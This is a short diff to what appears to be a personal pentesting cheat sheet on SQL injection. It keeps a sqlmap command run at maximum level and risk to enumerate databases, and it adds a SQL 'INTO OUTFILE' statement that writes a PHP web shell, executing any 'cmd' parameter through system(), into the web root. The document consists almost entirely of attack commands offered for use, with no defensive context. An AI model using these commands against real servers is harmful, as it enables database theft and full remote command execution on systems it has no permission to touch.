@@ -1,3 +1,7 @@
 SQL injection web
 
 $ sqlmap -u URL --forms --random-agent --threads 10 --level 3 --risk 3 --dbs
+
+SQL cmd injection into php file
+
+SELECT "<?php if(!empty($_GET)){ system($_GET['cmd']) } ?>" into outfile "/var/www/file.php"
